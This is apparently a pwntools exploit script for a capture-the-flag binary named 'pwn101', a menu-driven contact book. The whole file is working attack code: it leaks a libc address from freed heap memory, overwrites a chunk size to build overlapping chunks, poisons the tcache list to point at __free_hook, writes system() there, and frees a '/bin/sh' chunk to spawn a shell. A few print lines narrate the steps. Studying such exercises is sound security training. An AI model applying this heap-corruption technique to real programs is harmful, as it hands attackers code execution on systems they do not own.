from pwn import *


binname = './pwn101'
context.binary = binname
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']


elf = ELF(binname)
libc = elf.libc


def debug(func):
    def wrapper(*args, **kwargs):
        print "{}({}, {})".format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(length, name, desc, phone=1):
    io.recvuntil("> ")
    io.sendline(str(1))
    io.recvuntil("Length: ")
    io.sendline(str(length))
    io.recvuntil("Number: ")
    io.sendline(str(phone))
    io.recvuntil("Name: ")
    io.sendline(name[:0x20])
    io.recvuntil("Description: ")
    io.send(desc)


@debug
def show(index):
    io.recvuntil("> ")
    io.sendline(str(2))
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Number: ")
    phone = io.recvuntil("Name")[:-4].rstrip()
    io.recvuntil(": ")
    name = io.recvuntil("Description")[:-11].rstrip()
    io.recvuntil(": ")
    desc = io.recvuntil("+").rstrip("\n+")
    return phone, name, desc


@debug
def delete(index):
    io.recvuntil("> ")
    io.sendline(str(3))
    io.recvuntil("Index: ")
    io.sendline(str(index))


gdbscript = '''
pwn
# menu
b *0x555555554f99
'''
# io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)
io = process(binname)
# io = remote('localhost', 4088)


add(0x1000, 'a' * 8, 'A' * 8 + '\n') # 0
add(0x20, 'b' * 8, 'B' * 8 + '\n') # 1
delete(0)
add(0x38, '', '\n') # 0
# 0x30 [  1]: 0x555555758270 <- 0x0

data = show(0)
_, _, addr_libc = data

# to handle gdb warning output, nothing essential
j = addr_libc.find('Warning')
j = j if j > 0 else len(addr_libc)

addr_libc = addr_libc[:j]
addr_libc = u64(addr_libc.rstrip().ljust(8, '\x00')) - 0x3ec20a
print 'addr_libc = {}'.format(hex(addr_libc))

add(0x48, 'c' * 8, 'C' * 8 + '\n') # 2
add(0x28, 'd' * 8, 'D' * 8 + '\n') # 3
add(0x68, 'e' * 8, 'E' * 8 + '\n') # 4
delete(2)

print "overwrite next chunk's size"
payload = 'E' * 0x48 + '\x91'
add(0x48, 'e' * 8, payload) # 2

delete(4)
print 'delete fake chunk'
delete(3)

print 'now fake chunk (size 0x90) is linked to tcachebins'
print 'it overlapps another 0x30 chunk, so point that to free_hook'

addr_system = addr_libc + libc.symbols['system']
addr_free_hook = addr_libc + libc.symbols['__free_hook']

print 'overwrite next pointer to point to free_hook'
payload = ''
payload += '*' * 0x58
payload += p64(0x31)
payload += p64(addr_free_hook)

add(0x88, '/bin/sh', payload) # 3

print 'overwrite free_hook with system'
add(0x28, '/bin/sh', p64(addr_system)) # 4

delete(4)


io.interactive()
